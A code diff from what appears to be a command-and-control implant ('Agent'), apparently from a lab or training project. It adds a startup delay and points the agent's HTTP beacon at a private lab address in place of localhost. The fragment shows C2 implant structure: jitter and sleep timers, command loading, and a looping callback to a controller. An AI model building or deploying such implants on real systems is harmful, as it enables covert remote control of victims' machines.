@@ -21,11 +21,12 @@ namespace Agent
         private static int _ttsMins;
         static void Main(string[] args)
         {
+            Thread.Sleep(10000);
             _jitterSeconds = 15;
             _ttsMins = 1;
             GenerateMetadata();
             LoadAgentCommands();
-            _commModule = new HttpCommModule("localhost", 443);
+            _commModule = new HttpCommModule("192.168.56.102", 443);
             _commModule.Init(_metadata);
             while (true)
             {
